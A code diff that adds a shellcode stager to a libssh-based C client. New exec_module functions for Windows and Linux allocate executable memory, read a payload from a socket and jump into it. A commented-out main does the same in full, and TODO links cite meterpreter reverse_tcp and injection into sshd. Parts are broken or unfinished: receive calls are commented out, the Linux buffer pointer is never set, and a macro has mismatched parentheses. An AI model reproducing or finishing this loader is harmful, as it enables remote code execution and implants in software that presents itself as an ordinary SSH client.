@@ -24,9 +24,124 @@ clients must be made or how a client should react.
 
 #ifdef _WIN32
 #define strncasecmp _strnicmp
+int exec_module(ssh_session session){
+	ULONG32 payload_size;
+    char * alloc_mem_ptr;
+    int i;
+    void (*func_ptr)();
+    
+    // Tests connection
+    //int sock_count = recv(remote_sock, (char *)&payload_size, 4, 0);
+    
+    //if (sock_count != 4 || payload_size <= 0) 
+      //  cleanup_sockets(remote_sock);
+    
+    alloc_mem_ptr = VirtualAlloc(0, payload_size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    if (alloc_mem_ptr == NULL) 
+        return -1;
+        
+    alloc_mem_ptr[0] = 0xBF;
+    // writes first 4 bytes of socket information into second position of alloc_mem_ptr
+    memcpy(alloc_mem_ptr + 1, &remote_sock, 4);
+
+	int rc=0;
+    int count=0;
+    void * startb = alloc_mem_ptr + 5;
+    while (count < payload_size) {
+        //rc = recv(sock, (char *)startb, size_of - count, 0);
+        startb += rc; 
+        count += rc;
+        if (rc == SOCKET_ERROR) 
+            return -1;
+    }
+
+    func_ptr = (void (*)())alloc_mem_ptr;
+    func_ptr();
+}
 #include <winsock.h>
 #else
 #include <unistd.h>
+#include <sys/mman.h>
+int exec_module(ssh_session session){
+	unsigned long payload_size;
+    char * alloc_mem_ptr;
+    int i;
+    void (*func_ptr)();
+
+
+/* TODO LINKS:
+ * https://www.codeproject.com/articles/33340/code-injection-into-running-linux-application
+ * https://forums.pcsx2.net/Thread-blog-VirtualAlloc-on-Linux
+ * https://rapid7.github.io/metasploit-framework/api/Msf/Exploit.html#handler_bind%3F-instance_method
+ * https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Remote.html
+ * https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/handler.rb
+ * https://github.com/rapid7/metasploit-framework/search?utf8=%E2%9C%93&q=MSF%3A%3AExploit%3A%3ARemote&type=
+ * https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit.rb
+ * https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/
+ * https://attack.mitre.org/techniques/T1055/
+ * https://www.rapid7.com/db/modules/payload/linux/armle/meterpreter/reverse_tcp
+ * https://github.com/rapid7/metasploit-framework/blob/master/msfvenom
+ * https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/python/meterpreter/reverse_tcp.md
+ */
+
+
+
+
+
+
+
+        
+    //int sock_count = recv(remote_sock, (char *)&char_buf_ptr, 4, 0);
+    
+    //if (sock_count != 4 || char_buf_ptr <= 0) 
+    //    cleanup_sockets(remote_sock);
+    
+    //alloc_mem_ptr = VirtualAlloc(0, char_buf_ptr + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	// to RESERVE memory in Linux, use mmap with a private, anonymous, non-accessible mapping.
+	// The following line reserves 1gb of ram starting at 0x10000000.
+
+	void* mem_ptr = mmap(0, payload_size, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+	// to COMMIT memory in Linux, use mprotect on the range of memory you'd like to commit, and
+	// grant the memory READ and/or WRITE access.
+	// The following line commits 1mb of the buffer.  It will return -1 on out of memory errors.
+
+	int result3 = mprotect(mem_ptr, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC);
+	if (result3 < 0)
+	{
+		perror("Failed to commit memory");
+		return -1;
+	}
+	
+
+
+    if (alloc_mem_ptr == NULL)
+		return -1;
+        
+    alloc_mem_ptr[0] = 0xBF;
+    // writes first 4 bytes of socket information into second position of alloc_mem_ptr
+    //memcpy(alloc_mem_ptr + 1, &remote_sock, 4);
+
+	int rc=0;
+    int count=0;
+    void * startb = alloc_mem_ptr + 5;
+    while (count < payload_size) {
+        //rc = recv(sock, (char *)startb, size_of - count, 0);
+        startb += rc; 
+        count += rc;
+        if (rc == -1) 
+            return -1;
+    } 
+        
+    //sock_count = get_payload(remote_sock, alloc_mem_ptr + 5, char_buf_ptr);
+
+    func_ptr = (void (*)())alloc_mem_ptr;
+    func_ptr();
+
+	
+
+}
 #endif
 
 void remchar(char *, char, char *);
@@ -35,6 +150,7 @@ int verify_knownhost(ssh_session);
 int authenticate_console(ssh_session);
 static void error(ssh_session);
 ssh_session connect_ssh(const char *, const char *,int);
+
 
 
 void remchar(char *msg, char rem, char *buff){
@@ -429,6 +545,7 @@ int direct_forwarding(ssh_session session)
   	return SSH_OK;
 }
 
+
 int main(int argc, char* argv[]){
     char user[] = "aris";
     char host[] = "127.0.0.1";
@@ -456,22 +573,68 @@ int main(int argc, char* argv[]){
 }
 
 /*
-int main(int argc, char* argv){
-  	ssh_session my_ssh_session;
-  	int rc;
-  	my_ssh_session = ssh_new();
-  	if (my_ssh_session == NULL)
-    	exit(-1);
-  	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, "127.0.0.1");
-  	rc = ssh_connect(my_ssh_session);
-  	if (rc != SSH_OK)
-  	{
-    	fprintf(stderr, "Error connecting to localhost: %s\n", ssh_get_error(my_ssh_session));
-    	exit(-1);
-  	}
-	ssh_disconnect(my_ssh_session);
-  	ssh_free(my_ssh_session);
-	printf("Successfully connected and disconnected from session\n");
-	return 0;
+void init_socket() {
+    WORD word_ex = MAKEWORD((2, 2); 
+    WSADATA data;
+    if (WSAStartup(word_ex, &data) < 0) { 
+        WSACleanup(); 
+        exit(1);
+    }
+}
 
-}*/
+void cleanup_sockets(SOCKET sock) {
+    closesocket(sock);
+    WSACleanup();
+    exit(1);
+}
+
+int get_payload(SOCKET sock, void * start_byte_ptr, int size_of){
+    int rc=0;
+    int count=0;
+    void * startb = start_byte_ptr;
+    while (count < size_of) {
+        rc = recv(sock, (char *)startb, size_of - count, 0);
+        startb += rc; 
+        count += rc;
+        if (rc == SOCKET_ERROR) 
+            cleanup_sockets(sock);
+    } 
+    return count; 
+}
+
+
+int main(int argc, char * argv[]) {
+    ULONG32 payload_size;
+    char * alloc_mem_ptr;
+    int i;
+    void (*func_ptr)();
+        
+    init_socket();
+
+    SOCKET remote_sock = do_connect();
+    
+    // Tests connection
+    int sock_count = recv(remote_sock, (char *)&payload_size, 4, 0);
+    
+    if (sock_count != 4 || payload_size <= 0) 
+        cleanup_sockets(remote_sock);
+    
+    alloc_mem_ptr = VirtualAlloc(0, payload_size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    if (alloc_mem_ptr == NULL) 
+        cleanup_sockets(remote_sock);
+        
+    alloc_mem_ptr[0] = 0xBF;
+    // writes first 4 bytes of socket information into second position of alloc_mem_ptr
+    memcpy(alloc_mem_ptr + 1, &remote_sock, 4);
+        
+    sock_count = get_payload(remote_sock, alloc_mem_ptr + 5, payload_size);
+
+    func_ptr = (void (*)())alloc_mem_ptr;
+    func_ptr();
+
+    return 0;
+}
+
+
+*/
